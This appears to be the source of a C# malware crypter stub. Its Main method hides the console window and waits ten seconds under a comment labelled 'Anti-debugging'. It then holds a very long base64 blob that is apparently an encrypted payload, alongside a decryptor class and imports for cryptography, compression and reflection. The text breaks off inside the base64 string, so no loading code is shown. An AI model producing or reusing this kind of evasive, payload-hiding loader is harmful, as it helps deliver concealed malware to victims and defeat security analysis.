
using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Linq;

namespace Stub
{
    abstract class BaseDecryptor
    {
        public abstract byte[] Decrypt(byte[] data, byte[] key, byte[] iv);
    }

    class ebWYdWNvLk : BaseDecryptor
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            try
            {
                Thread.Sleep(10000); // Anti-debugging: delay execution

                string encodedData = "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